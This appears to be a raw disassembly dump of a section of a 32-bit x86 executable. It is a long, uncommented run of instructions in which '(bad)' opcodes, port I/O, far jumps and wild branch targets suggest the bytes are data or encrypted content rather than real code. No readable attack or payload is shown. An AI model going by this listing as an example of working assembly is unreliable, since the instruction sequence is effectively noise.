  4088e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088e8:	or     DWORD PTR [edi-0x294cf751],eax
  4088ee:	fiadd  WORD PTR [esi]
  4088f0:	sub    al,0xa6
  4088f2:	fwait
  4088f3:	and    ah,BYTE PTR es:[esi]
  4088f6:	sahf   
  4088f7:	in     eax,0x98
  4088f9:	xchg   ecx,eax
  4088fa:	sbb    eax,0xb8f30965
  4088ff:	fimul  DWORD PTR [esi+0x49d9ffa9]
  408905:	rcr    BYTE PTR [ebx+0x62905346],cl
  40890b:	in     al,0xd6
  40890d:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40890f:	jmp    0xa36c569f
  408914:	call   FWORD PTR [eax+0x405038]
  40891a:	jg     0x40895e
  40891c:	jo     0x4088eb
  40891e:	dec    ebx
  40891f:	popa   
  408920:	inc    eax
  408921:	inc    ebx
  408922:	push   ecx
  408923:	(bad)  
  408924:	sar    BYTE PTR [eax],cl
  408926:	sub    eax,0x9babdd6d
  40892b:	dec    esp
  40892c:	jbe    0x408939
  40892e:	jle    0x408955
  408930:	add    DWORD PTR [edx-0x2c],0x8
  408934:	out    0xf2,al
  408936:	jl     0x40892a
  408938:	inc    edi
  408939:	fsubr  st,st(6)
  40893b:	pusha  
  40893c:	add    DWORD PTR [ecx],0x54
  40893f:	in     eax,dx
  408940:	les    esp,FWORD PTR [ecx-0x33]
  408943:	mov    edx,0xd53dbbb0
  408948:	mov    edi,0xf3f672de
  40894d:	push   esi
  40894e:	add    BYTE PTR [ecx],bh
  408950:	xchg   edi,eax
  408951:	sbb    eax,0x26390593
  408956:	aas    
  408957:	adc    BYTE PTR [edi+0x31],0x52
  40895b:	jb     0x408977
  40895d:	ficom  DWORD PTR [eax-0xa]
  408960:	cmp    ebx,DWORD PTR [eax+0x6075fe66]
  408966:	mov    ds:0x57466441,eax
  40896b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40896c:	and    ebp,DWORD PTR [edi+0x58]
  40896f:	sub    ecx,ebp
  408971:	cmc    
  408972:	addr16 mov edi,0x524b0081
  408978:	ja     0x408971
  40897a:	xor    cl,BYTE PTR [edi-0x16]
  40897d:	xor    edx,DWORD PTR [esp+edi*8]
  408980:	mov    WORD PTR [ebx+0x22cbe0c3],ss
  408986:	cld    
  408987:	adc    bl,ah
  408989:	sub    esp,ebp
  40898b:	test   DWORD PTR [eax-0x6b],edi
  40898e:	jbe    0x408997
  408990:	sbb    BYTE PTR [ebp-0x16],cl
  408993:	(bad)  
  408994:	out    dx,eax
  408995:	sbb    eax,0x18e6b20a
  40899a:	cmp    ch,BYTE PTR [edi]
  40899c:	enter  0xad0d,0xb
  4089a0:	into   
  4089a1:	inc    eax
  4089a2:	xlat   BYTE PTR ds:[ebx]
  4089a3:	imul   DWORD PTR [edx-0x3d]
  4089a6:	jae    0x4089f2
  4089a8:	or     eax,0xd7460c04
  4089ad:	add    eax,0xc772b582
  4089b2:	inc    eax
  4089b3:	bound  eax,QWORD PTR [ecx-0x59]
  4089b6:	iret   
  4089b7:	jmp    0xde7f:0x3a8c9d9b
  4089be:	pop    esi
  4089bf:	dec    ebp
  4089c0:	dec    esp
  4089c1:	push   eax
  4089c2:	ins    BYTE PTR es:[edi],dx
  4089c3:	dec    esp
  4089c4:	sbb    esi,edi
  4089c6:	test   dl,bl
  4089c8:	stos   DWORD PTR es:[edi],eax
  4089c9:	outs   dx,BYTE PTR ds:[esi]
  4089ca:	aas    
  4089cb:	arpl   WORD PTR [ecx+0x78],bp
  4089ce:	pop    ecx
  4089cf:	stos   DWORD PTR es:[edi],eax
  4089d0:	retf   0x4f93
  4089d3:	rcr    DWORD PTR [ebx],cl
  4089d5:	xchg   bh,dh
  4089d7:	xor    al,bl
  4089d9:	cdq    
  4089da:	retf   0x62c1
  4089dd:	xchg   BYTE PTR [esi+0x4b],cl
  4089e0:	ret    0xb198
  4089e3:	cld    
  4089e4:	mov    esi,0x87aaaa1c
  4089e9:	or     eax,0x2d366fc9
  4089ee:	push   edi
  4089ef:	cmp    BYTE PTR [ecx+ecx*8-0x4dd9176],ah
  4089f6:	stc    
  4089f7:	gs retf 
  4089f9:	mov    edi,0x98c5999c
  4089fe:	and    dh,bh
  408a00:	mov    ds:0x2280f331,eax
  408a05:	sbb    eax,0xd80404c1
  408a0a:	add    al,0xa
  408a0c:	xchg   ebp,eax
  408a0d:	or     edx,DWORD PTR [edi-0x69]
  408a10:	fidivr DWORD PTR [edi-0xa]
  408a13:	xchg   eax,eax
  408a15:	or     eax,0x7de129dc
  408a1a:	push   ebp
  408a1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a1c:	gs mov edi,0x7008e5cf
  408a22:	enter  0xc658,0xc8
  408a26:	pop    eax
  408a27:	jno    0x408a85
  408a29:	(bad)  
  408a2b:	call   0x149ed28e
  408a30:	push   esi
  408a31:	fdiv   QWORD PTR ds:0x93606301
  408a37:	xlat   BYTE PTR ds:[ebx]
  408a38:	int3   
  408a39:	cmp    edi,DWORD PTR [eax-0x2ba3f5d7]
  408a3f:	clc    
  408a40:	lahf   
  408a41:	cld    
  408a42:	call   0x3a85e3ab
  408a47:	cld    
  408a48:	mov    cl,BYTE PTR ds:0x911e8193
  408a4e:	pop    edx
  408a4f:	mov    ah,0x93
  408a51:	in     al,0xb4
  408a53:	pop    ebp
  408a54:	xor    ecx,DWORD PTR [ecx+ebx*4-0x6c]
  408a58:	add    esp,DWORD PTR [esp+edx*1-0x76]
  408a5c:	adc    DWORD PTR [ebx],esi
  408a5e:	push   ebx
  408a5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a60:	inc    edx
  408a61:	mov    eax,ds:0xfc436bee
  408a66:	push   edi
  408a67:	aas    
  408a68:	push   eax
  408a69:	in     al,0x48
  408a6b:	(bad)  
  408a6c:	xlat   BYTE PTR ds:[ebx]
  408a6d:	or     esp,DWORD PTR [edi-0x74]
  408a70:	popf   
  408a71:	ds adc cl,ch
  408a74:	sub    DWORD PTR [edx+0x5c],edx
  408a77:	push   0x3c7cd8b3
  408a7c:	lods   eax,DWORD PTR ds:[esi]
  408a7d:	clc    
  408a7e:	leave  
  408a7f:	push   edi
  408a80:	leave  
  408a81:	lock cmp eax,0xb3ecb84b
  408a87:	add    BYTE PTR [ebp+0x6ddea25b],ch
  408a8d:	inc    edx
  408a8e:	push   edx
  408a8f:	enter  0x4799,0x77
  408a93:	push   ebx
  408a94:	sub    eax,0xe910c783
  408a99:	xor    al,0x5a
  408a9b:	xchg   ebx,eax
  408a9c:	cs daa 
  408a9e:	sub    bh,BYTE PTR [ecx]
  408aa0:	add    ebx,esi
  408aa2:	pop    esp
  408aa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aa4:	jmp    0x408acf
  408aa6:	sbb    DWORD PTR ds:0xdcf4e6ec,edx
  408aac:	or     BYTE PTR [ebx-0x67],dl
  408aaf:	or     bh,BYTE PTR [edi+0x3e]
  408ab2:	in     eax,0xb0
  408ab4:	sbb    eax,0xee62d4d0
  408ab9:	cs push ds
  408abb:	jmp    0x59bc:0x1f9c6a7b
  408ac2:	xor    eax,0xf4285af4
  408ac7:	lahf   
  408ac8:	or     DWORD PTR [ecx],ebx
  408aca:	mov    ebx,0x78f2606a
  408acf:	rol    BYTE PTR [ebp+0x6e],1
  408ad2:	das    
  408ad3:	sub    eax,0xbd881525
  408ad8:	cdq    
  408ad9:	inc    esp
  408ada:	push   ebp
  408adb:	mov    eax,ds:0x68ffe963
  408ae0:	ja     0x408b30
  408ae2:	sub    edx,DWORD PTR [edx-0x7bfe5c61]
  408ae8:	xchg   BYTE PTR [esi-0x7e93b6c1],al
  408aee:	sub    esp,edi
  408af0:	or     DWORD PTR [ecx-0x68],0x759fa267
  408af7:	fistp  DWORD PTR [ecx-0x48]
  408afa:	mov    esp,0x1253675b
  408aff:	push   ss
  408b00:	dec    esi
  408b01:	repz push esi
  408b03:	test   eax,0xfa3addb3
  408b08:	int3   
  408b09:	inc    ebx
  408b0a:	fmul   DWORD PTR [edx]
  408b0c:	sti    
  408b0d:	imul   eax,ebp,0x75
  408b10:	adc    dl,BYTE PTR [ecx+0x2e9d283e]
  408b16:	add    ch,ah
  408b18:	add    esp,DWORD PTR [esp+ebp*1+0x19]
  408b1c:	js     0x408b29
  408b1e:	test   eax,0x6f869593
  408b23:	xchg   DWORD PTR [esi+eiz*1-0x79c6fb2a],edx
  408b2a:	mov    dl,0x58
  408b2c:	cmp    dl,BYTE PTR [ecx-0x9]
  408b2f:	dec    edi
  408b30:	lahf   
  408b31:	ret    0xbc0b
  408b34:	pusha  
  408b35:	scas   al,BYTE PTR es:[edi]
  408b36:	push   ebx
  408b37:	pop    es
  408b38:	icebp  
  408b39:	les    edi,FWORD PTR [edx+0x62]
  408b3c:	ror    edx,1
  408b3e:	call   0xcb2d:0x3572b561
  408b45:	jbe    0x408b4a
  408b47:	es int3 
  408b49:	imul   edi,DWORD PTR [esi+0x210e5fd5],0x924960de
  408b53:	push   esi
  408b54:	adc    eax,0xa28c5e4c
  408b59:	icebp  
  408b5a:	xchg   esi,eax
  408b5b:	mov    eax,0x58ee0623
  408b60:	adc    DWORD PTR [ebp-0x2d],ebp
  408b63:	fneni(8087 only) 
  408b65:	int3   
  408b66:	loopne 0x408af7
  408b68:	imul   ebp,DWORD PTR [ebx-0x2e806c38],0xba8c29f2
  408b72:	aad    0xf9
  408b74:	pop    eax
  408b75:	iret   
  408b76:	add    BYTE PTR [edx-0x5581fee9],0x67
  408b7d:	test   eax,0xf206e2f3
  408b82:	mov    edi,0xe110180a
  408b87:	pop    edx
  408b88:	in     eax,dx
  408b89:	hlt    
  408b8a:	sub    DWORD PTR [esi+0x1dbba22a],esp
  408b90:	sbb    BYTE PTR ds:0xb13e70e6,bl
  408b96:	xor    al,0xb8
  408b98:	inc    ebp
  408b99:	mov    esp,0xa4bc0322
  408b9e:	push   DWORD PTR [esp+ecx*1+0x76aa45d5]
  408ba5:	cmp    eax,0x605b8851
  408baa:	sbb    ch,ah
  408bac:	cmp    BYTE PTR [edi-0x4f],bh
  408baf:	and    al,0x92
  408bb1:	xchg   ebx,eax
  408bb2:	cmp    eax,0xb55d1ae2
  408bb7:	jge    0x408b55
  408bb9:	jecxz  0x408b92
  408bbb:	pop    ds
  408bbc:	call   0xa348:0x2f4e5dfd
  408bc3:	push   ecx
  408bc4:	mov    eax,ds:0xd427297
  408bc9:	cmc    
  408bca:	xchg   edx,eax
  408bcb:	aad    0xe6
  408bcd:	sar    eax,1
  408bcf:	mov    ah,0x8e
  408bd1:	jae    0x408bb7
  408bd3:	call   0xd27238e2
  408bd8:	shr    BYTE PTR [ebx+eax*8+0x2d5286ad],1
  408bdf:	popa   
  408be0:	(bad)  
  408be1:	ss inc ecx
  408be3:	xchg   ebx,eax
  408be4:	cwde   
  408be5:	inc    ecx
  408be6:	repnz push es
  408be8:	scas   al,BYTE PTR es:[edi]
  408be9:	fmul   QWORD PTR [edi-0x1b0ae3a2]
  408bef:	out    dx,al
  408bf0:	sti    
  408bf1:	repnz in eax,dx
  408bf3:	or     BYTE PTR [esi],bl
  408bf5:	std    
  408bf6:	stos   BYTE PTR es:[edi],al
  408bf7:	sbb    ebx,ebp
  408bf9:	xchg   BYTE PTR [ebx-0x2818e1ab],ch
  408bff:	jmp    0x408c50
  408c01:	fcom   QWORD PTR [edi-0xf]
  408c04:	imul   esi,DWORD PTR [ecx+0x77],0x2b8a6917
  408c0b:	cwde   
  408c0c:	cmp    ch,ah
  408c0e:	mov    ah,0x99
  408c10:	dec    ecx
  408c11:	jns    0x408c33
  408c13:	inc    edx
  408c14:	inc    esi
  408c15:	es mov edx,0xaf7e0454
  408c1b:	fild   QWORD PTR [esp+eax*2]
  408c1e:	faddp  st(5),st
  408c20:	add    esi,ebp
  408c22:	out    dx,eax
  408c23:	mov    ch,0xd7
  408c25:	ss je  0x408c2b
  408c28:	xchg   bh,al
  408c2a:	jns    0x408bf8
  408c2c:	cmp    DWORD PTR [eax],edx
  408c2e:	pop    ebp
  408c2f:	(bad)  
  408c31:	daa    
  408c32:	xor    esp,DWORD PTR [esi+0x2c54b9ac]
  408c38:	push   ecx
  408c39:	fisttp DWORD PTR [esi+eax*1+0xba99d44]
  408c40:	arpl   WORD PTR [edi],bx
  408c42:	clc    
  408c43:	cmp    eax,0x2b3fa135
  408c48:	jmp    0xf099:0x4c8fa45f
  408c4f:	push   edx
  408c50:	cmp    ebx,DWORD PTR [edx-0x6a60eafc]
  408c56:	test   al,0x3f
  408c58:	mov    esi,0x114a0566
  408c5d:	pop    ds
  408c5e:	shl    esi,1
  408c60:	addr16 ret 
  408c62:	ficom  DWORD PTR [edx+0x7484fa3b]
  408c68:	mov    ds:0xfa73750e,eax
  408c6d:	inc    ebx
  408c6e:	call   0xb114018b
  408c73:	sbb    bl,BYTE PTR [ebp+0x5b]
  408c76:	fstp   QWORD PTR [esi-0x415cd195]
  408c7c:	pop    esi
  408c7d:	enter  0xd2c7,0xed
  408c81:	push   ebx
  408c82:	adc    BYTE PTR [edx+0x513475c0],dl
  408c88:	and    DWORD PTR [ecx-0x5f],ecx
  408c8b:	xchg   edx,eax
  408c8c:	xchg   ebp,eax
  408c8d:	push   ebp
  408c8e:	sar    DWORD PTR [ebx-0x1],0x58
  408c92:	xor    BYTE PTR [ecx+0x78],cl
  408c95:	sahf   
  408c96:	sahf   
  408c97:	dec    edi
  408c98:	xor    ch,BYTE PTR [eax+0x4d]
  408c9b:	fidiv  DWORD PTR ds:0x5a6e013c
  408ca1:	js     0x408ca0
  408ca3:	fdivr  DWORD PTR [eax+0x3e]
  408ca6:	sbb    BYTE PTR [edx-0x10],0x35
  408caa:	push   0x32
  408cac:	call   0x5350:0xdb81b363
  408cb3:	loopne 0x408cbf
  408cb5:	shl    BYTE PTR [ebp-0x10],1
  408cb8:	or     eax,0x4c02fe50
  408cbd:	dec    eax
  408cbe:	xchg   ebx,eax
  408cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cc0:	loope  0x408c43
  408cc2:	cwde   
  408cc3:	adc    ebx,ecx
  408cc5:	iret   
  408cc6:	jnp    0x408c52
  408cc8:	js     0x408cf8
  408cca:	popa   
  408ccb:	xchg   ecx,eax
  408ccc:	and    al,0x75
  408cce:	pop    ebx
  408ccf:	mov    ds,WORD PTR [esi]
  408cd1:	jl     0x408cbb
  408cd3:	int3   
  408cd4:	pusha  
  408cd5:	xchg   esp,eax
  408cd6:	aaa    
  408cd7:	xor    edx,DWORD PTR [eax+0x22fb2f4f]
  408cdd:	jbe    0x408c9d
  408cdf:	inc    esp
  408ce0:	neg    bl
  408ce2:	leave  
  408ce3:	mov    eax,ds:0xabf9d4a8
  408ce8:	div    DWORD PTR [ebx]
  408cea:	out    dx,al
  408ceb:	imul   eax,ebx,0xffffffa4
  408cee:	or     eax,0xa25427c9
  408cf3:	loopne 0x408ca3
  408cf5:	scas   al,BYTE PTR es:[edi]
  408cf6:	clc    
  408cf7:	push   edx
  408cf8:	cwde   
  408cf9:	xor    ah,bl
  408cfb:	arpl   WORD PTR [ebx+0x44],sp
  408cfe:	pop    ds
  408cff:	scas   eax,DWORD PTR es:[edi]
  408d00:	or     bl,BYTE PTR [ecx]
  408d02:	imul   ebx,esi,0x6d6290dc
  408d08:	and    edi,edi
  408d0a:	adc    al,0x2a
  408d0c:	aaa    
  408d0d:	jl     0x408d77
  408d0f:	inc    ebx
  408d10:	xchg   ecx,eax
  408d11:	mov    ch,0x54
  408d13:	jne    0x408caf
  408d15:	push   eax
  408d16:	ds push esi
  408d18:	and    cl,BYTE PTR [ebx-0x2b0661b0]
  408d1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d1f:	mov    ds:0xba3a4bc8,al
  408d24:	ins    BYTE PTR es:[edi],dx
  408d25:	retf   
  408d26:	ror    BYTE PTR [eax+edx*8+0x64b5791e],cl
  408d2d:	cmp    al,0xa8
  408d2f:	cli    
  408d30:	rcr    DWORD PTR ds:0x6d0e8aec,1
  408d36:	push   cs
  408d37:	addr16 icebp 
  408d39:	adc    al,0x9c
  408d3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d3c:	and    ch,BYTE PTR ds:0xd3eff61e
  408d42:	nop
  408d43:	pop    es
  408d44:	mov    ecx,0x64e16472
  408d49:	jecxz  0x408d6d
  408d4b:	xor    BYTE PTR ds:0xacc4c103,0xdf
  408d52:	jo     0x408ce2
  408d54:	aaa    
  408d55:	inc    edi
  408d56:	inc    DWORD PTR [edi+0x2]
  408d59:	jmp    0x60fdf904
  408d5e:	test   al,0x29
  408d60:	push   cs
  408d61:	sbb    edi,edx
  408d63:	sub    al,0xc7
  408d65:	and    DWORD PTR [ecx],ebx
  408d67:	add    ebp,DWORD PTR [ebp-0x2c]
  408d6a:	int3   
  408d6b:	pop    DWORD PTR [edi-0xa5431f7]
  408d71:	and    edx,DWORD PTR [eax-0x54]
  408d74:	xlat   BYTE PTR ds:[ebx]
  408d75:	lods   eax,DWORD PTR ds:[esi]
  408d76:	sub    edi,esi
  408d78:	push   ecx
  408d79:	dec    esi
  408d7a:	xor    bl,ch
  408d7c:	jge    0x408d38
  408d7e:	or     DWORD PTR [esi-0x62333a34],esp
  408d84:	mov    ebx,0xc757d133
  408d89:	sbb    bh,BYTE PTR [eax-0x16]
  408d8c:	mov    dh,0x96
  408d8e:	inc    ebp
  408d8f:	(bad)  
  408d90:	lea    edx,[esi+0x18]
  408d93:	or     dh,BYTE PTR [esi-0x42]
  408d96:	or     dl,BYTE PTR [ecx-0x78]
  408d99:	jne    0x408d38
  408d9b:	cld    
  408d9c:	jl     0x408dce
  408d9e:	sub    bh,dl
  408da0:	cmp    ebx,ebp
  408da2:	aaa    
  408da3:	sbb    al,0x53
  408da5:	push   0xa3934943
  408daa:	loop   0x408d79
  408dac:	xor    ebx,DWORD PTR [edx-0x4e]
  408daf:	nop
  408db0:	jle    0x408dd7
  408db2:	sbb    al,0x5d
  408db4:	lahf   
  408db5:	mov    ecx,0xa47d5f9c
  408dba:	aas    
  408dbb:	ret    0xaefa
  408dbe:	mov    edx,0xb8cdaad6
  408dc3:	imul   ebp,DWORD PTR [esi-0x44],0x9f47ea71
  408dca:	pop    esi
  408dcb:	xor    dh,BYTE PTR [esp+ebx*8]
  408dce:	(bad)
  408dd1:	out    dx,eax
  408dd2:	and    BYTE PTR [eax],al
  408dd4:	ds out 0x66,eax
  408dd7:	popf   
  408dd8:	or     eax,0xce978b2d
  408ddd:	(bad)  
  408dde:	shl    ah,1
  408de0:	dec    esi
  408de1:	(bad)  
  408de2:	test   BYTE PTR [ebx+0xf231633],cl
  408de8:	jl     0x408e45
  408dea:	mov    edi,0x2f76dc26
  408def:	and    eax,edi
  408df1:	outs   dx,DWORD PTR ds:[esi]
  408df2:	js     0x408e23
  408df4:	mov    ebp,esi
  408df6:	mov    ds:0xfb215134,eax
  408dfb:	(bad)  [ecx]
  408dfd:	mov    edi,0x825033ea
  408e02:	cmp    cl,ch
  408e04:	outs   dx,BYTE PTR ds:[esi]
  408e05:	shl    BYTE PTR [ebx+0x290ad7e7],cl
  408e0b:	lahf   
  408e0c:	es push edx
  408e0e:	shr    ecx,1
  408e10:	push   ebp
  408e11:	cmp    DWORD PTR [edx],ecx
  408e13:	add    DWORD PTR [edx],ebp
  408e15:	fisub  DWORD PTR [eax-0x64cdf7c0]
  408e1b:	cld    
  408e1c:	or     ebx,0x43
  408e1f:	mov    fs,WORD PTR [edx+ebp*2]
  408e22:	xchg   ecx,eax
  408e23:	rol    BYTE PTR [esi-0x7a0889b3],cl
  408e29:	addr16 retf 0xfb4d
  408e2d:	sub    al,0x1b
  408e2f:	and    al,0x7b
  408e31:	sbb    bl,BYTE PTR [esp+eax*1+0x49]
  408e35:	mov    bl,0x63
  408e37:	jns    0x408e79
  408e39:	push   ds
  408e3a:	scas   eax,DWORD PTR es:[edi]
  408e3b:	cmp    ah,0x93
  408e3e:	rcr    ebp,1
  408e40:	mov    ds:0x721de56e,al
  408e45:	cmp    al,0x28
  408e47:	cmp    BYTE PTR [edi-0x7c720c96],dh
  408e4d:	inc    ebx
  408e4e:	ds xchg esi,eax
  408e50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e51:	push   ecx
  408e52:	push   eax
  408e53:	inc    edi
  408e54:	dec    edi
  408e55:	mov    dl,0x21
  408e57:	mov    ds:0xc3485e77,al
  408e5c:	cmp    DWORD PTR [edx-0xa],eax
  408e5f:	mov    esp,0x2c00c4fe
  408e64:	sub    bl,BYTE PTR [eax+ebp*4]
  408e67:	mov    bl,0xa6
  408e69:	outs   dx,DWORD PTR ds:[esi]
  408e6a:	mov    esp,0xdc539a65
  408e6f:	adc    ah,bh
  408e71:	jmp    0x9b44:0x47e039e7
  408e78:	mov    esi,0xff990c73
  408e7d:	add    edx,edx
  408e7f:	pop    es
  408e80:	arpl   WORD PTR [ecx+0x7d],bx
  408e83:	or     eax,0xd42892f5
  408e88:	mov    ebx,0x69935dbd
  408e8d:	shl    DWORD PTR [edx+0xfafdaeb],cl
  408e93:	inc    ebp
  408e94:	cmc    
  408e95:	xor    bl,BYTE PTR [ebx]
  408e97:	dec    eax
  408e98:	addr16 pop ds
  408e9a:	das    
  408e9b:	lods   al,BYTE PTR ds:[esi]
  408e9c:	xchg   ebx,eax
  408e9d:	mov    esi,0xaa70c16c
  408ea2:	stc    
  408ea3:	jo     0x408e6d
  408ea5:	jle    0x408ecc
  408ea7:	fld    TBYTE PTR [ebp-0x44]
  408eaa:	pop    esi
  408eab:	idiv   BYTE PTR [esi]
  408ead:	sub    bl,cl
  408eaf:	ss and edi,DWORD PTR ds:[ebx+0x51]
  408eb4:	xor    edi,DWORD PTR [esi+0x52]
  408eb7:	push   cs
  408eb8:	jp     0x408e65
  408eba:	iret   
  408ebb:	sbb    al,0xf1
  408ebd:	cli    
  408ebe:	mov    WORD PTR [ebx+0x2efe83e],?
  408ec4:	(bad)
  408ec8:	or     eax,0xc72816a3
  408ecd:	pop    ds
  408ece:	shl    ah,0x2f
  408ed1:	leave  
  408ed2:	mov    dl,0x0
  408ed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ed5:	jl     0x408e6d
  408ed7:	stos   DWORD PTR es:[edi],eax
  408ed8:	pushf  
  408ed9:	sbb    al,0x7a
  408edb:	jmp    FWORD PTR es:[edi+0x2ed3474c]
  408ee2:	test   ebp,ecx
  408ee4:	push   ebp
  408ee5:	les    eax,FWORD PTR [edi+esi*2+0x37]
  408ee9:	fnstenv [eax]
  408eeb:	push   cs
  408eec:	shr    BYTE PTR [esi+0x65db616b],cl
  408ef2:	mov    al,0xf1
  408ef4:	jne    0x408f67
  408ef6:	xlat   BYTE PTR ds:[ebx]
  408ef7:	int3   
  408ef8:	loopne 0x408f72
  408efa:	outs   dx,BYTE PTR ds:[esi]
  408efb:	leave  
  408efc:	aas    
  408efd:	sub    ebx,DWORD PTR [ecx+0x2e]
  408f00:	lea    eax,[edx]
  408f02:	cmp    eax,0x55f6f537
  408f07:	mov    DWORD PTR [edi],edi
  408f09:	std    
  408f0a:	mov    BYTE PTR [edi],0xd3
  408f0d:	call   0x61463b4c
  408f12:	cld    
  408f13:	leave  
  408f14:	jp     0x408f60
  408f16:	cli    
  408f17:	mov    edi,0xca46401b
  408f1c:	test   DWORD PTR [ebx],0xd74f19ed
  408f22:	adc    eax,0xc68e7e19
  408f27:	xor    eax,0x5539e3c0
  408f2c:	pop    edx
  408f2d:	ja     0x408f9e
  408f2f:	dec    edx
  408f30:	jb     0x408f29
  408f32:	cli    
  408f33:	dec    esp
  408f34:	inc    edi
  408f35:	adc    DWORD PTR [ecx-0x602c4bb0],ebx
  408f3b:	dec    edx
  408f3c:	clc    
  408f3d:	out    dx,al
  408f3e:	add    BYTE PTR [esi+ecx*2],0x5a
  408f42:	es sub al,0x26
  408f45:	nop
  408f46:	idiv   BYTE PTR [ecx+eax*4]
  408f49:	(bad)  
  408f4a:	enter  0x7464,0xa6
  408f4e:	popa   
  408f4f:	and    esp,DWORD PTR [eax+ebx*1+0x3f]
  408f53:	fwait
  408f54:	out    dx,al
  408f55:	push   edx
  408f56:	leave  
  408f57:	ret    
  408f58:	jecxz  0x408f65
  408f5a:	dec    esp
  408f5b:	imul   edx,ebx,0x7a
  408f5e:	call   0xd6c5b682
  408f63:	dec    edi
  408f64:	int3   
  408f65:	mov    cl,0x3d
  408f67:	ds es xchg ebp,eax
  408f6a:	push   ss
  408f6b:	lock fstp DWORD PTR [edx+0x60e8495b]
  408f72:	mov    WORD PTR [edx],ds
  408f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f75:	rcl    ah,0xd0
  408f78:	data16 cld 
  408f7a:	sub    ah,BYTE PTR [ebx+0x63]
  408f7d:	outs   dx,BYTE PTR ds:[esi]
  408f7e:	mov    esi,0x4bf48d16
  408f83:	out    0x4b,eax
  408f85:	enter  0xc734,0xde
  408f89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f8a:	dec    esi
  408f8b:	das    
  408f8c:	shl    al,cl
  408f8e:	jp     0x408f86
  408f90:	push   ebp
  408f91:	mov    BYTE PTR [edi-0x11],0x29
  408f95:	pop    esi
  408f96:	xor    esp,DWORD PTR [ebx-0x18]
  408f99:	hlt    
  408f9a:	call   FWORD PTR [ebx+0x4e]
  408f9d:	sbb    cl,BYTE PTR [ecx+0x12]
  408fa0:	out    0xcd,al
  408fa2:	adc    esp,esp
  408fa4:	sbb    BYTE PTR [edi+eax*1],ah
  408fa7:	mov    gs,WORD PTR [ebx-0x6c]
  408faa:	xchg   ebx,eax
  408fab:	mov    edi,0xfd55627f
  408fb0:	pop    ebx
  408fb1:	sahf   
  408fb2:	jmp    0xc014:0xfa743165
  408fb9:	cwde   
  408fba:	sub    al,0x63
  408fbc:	mov    esi,0x195a7794
  408fc1:	push   0xffffff97
  408fc3:	jbe    0x408f45
  408fc5:	xor    BYTE PTR [edx+0x1e1843d3],cl
  408fcb:	push   esi
  408fcc:	push   ds
  408fcd:	fcomp  DWORD PTR [edi]
  408fcf:	fimul  DWORD PTR [ecx-0xbdd3a23]
  408fd5:	sub    al,0x75
  408fd7:	ret    0x882c
  408fda:	(bad)  [esi]
  408fdc:	in     al,dx
  408fdd:	mov    ah,0x89
  408fdf:	cmp    BYTE PTR [edi],al
  408fe1:	dec    ebx
  408fe2:	sbb    DWORD PTR [eax+eiz*1-0x763f4e49],0x93763a7a
  408fed:	stos   DWORD PTR es:[edi],eax
  408fee:	push   esp
  408fef:	and    ch,BYTE PTR [esi-0x450131ff]
  408ff5:	je     0x408ff5
  408ff7:	scas   al,BYTE PTR es:[edi]
  408ff8:	jo     0x408fd4
  408ffa:	fisubr DWORD PTR [esi+0x10]
  408ffd:	mov    edi,0x217d473e
  409002:	outs   dx,DWORD PTR ds:[esi]
  409003:	in     al,0x4a
  409005:	(bad)  
  409007:	ror    DWORD PTR [ecx-0x3e],0xff
  40900b:	iret   
  40900c:	pop    ebx
  40900d:	daa    
  40900e:	js     0x408fd7
  409010:	out    0xbe,eax
  409012:	jnp    0x40903d
  409014:	push   ds
  409015:	out    0xe9,al
  409017:	add    BYTE PTR [edi],dl
  409019:	adc    cl,0x3c
  40901c:	xchg   esp,eax
  40901d:	cmp    al,0xc1
  40901f:	dec    ebx
  409020:	(bad)  
  409021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409022:	pop    es
  409023:	sub    al,0xac
  409025:	sub    ebx,DWORD PTR [edx]
  409027:	and    bl,BYTE PTR [ebx-0x2cfd1d62]
  40902d:	xchg   BYTE PTR [edx],dh
  40902f:	push   ss
  409030:	mov    edi,0xe79dfacf
  409035:	inc    edi
  409036:	lods   eax,DWORD PTR ds:[esi]
  409037:	jbe    0x40903b
  409039:	add    al,BYTE PTR [esi-0x6b]
  40903c:	pop    esp
  40903d:	or     esp,esp
  40903f:	or     al,0x4d
  409041:	xor    BYTE PTR [ecx+0xc],bh
  409044:	mov    DWORD PTR [ecx+0x2468355c],esp
  40904a:	test   al,0x25
  40904c:	je     0x409083
  40904e:	(bad)  
  40904f:	jmp    DWORD PTR [ecx-0x72]
  409052:	dec    esi
  409053:	lahf   
  409054:	and    DWORD PTR [edi],edx
  409056:	(bad)  
  409057:	test   eax,0x6b925bd2
  40905c:	neg    BYTE PTR [ebx+0x18cf3786]
  409062:	mov    al,ds:0x95b261dd
  409067:	mov    ch,0xfb
  409069:	dec    ebx
  40906a:	sub    eax,ebx
  40906c:	sahf   
  40906d:	lock jns 0x408ffd
  409070:	push   0x25c0d4c0
  409075:	ret    
  409076:	(bad)  
  409077:	enter  0xb39a,0x3c
  40907b:	inc    esp
  40907c:	mov    ebx,fs
  40907e:	fst    DWORD PTR [ecx]
  409080:	sbb    al,bl
  409082:	jb     0x4090a9
  409084:	mov    esp,0xbf485eb7
  409089:	add    BYTE PTR [edi-0x326d8662],ah
  40908f:	mov    dh,0x8c
  409091:	cmp    al,0x4e
  409093:	xor    dh,dh
  409095:	pusha  
  409096:	call   0xbffce91
  40909b:	loopne 0x409086
  40909d:	in     al,0x1d
  40909f:	mov    ecx,0xb479cb01
  4090a4:	mov    BYTE PTR [ebx+0x629d712a],ch
  4090aa:	or     eax,0x94505898
  4090af:	test   BYTE PTR [edi-0x2],0x95
  4090b3:	cwde   
  4090b4:	pop    es
  4090b5:	lods   al,BYTE PTR ds:[esi]
  4090b6:	mov    al,0xcb
  4090b8:	imul   ebx,ebp,0xffffffa4
  4090bb:	add    dh,bl
  4090bd:	jno    0x4090e7
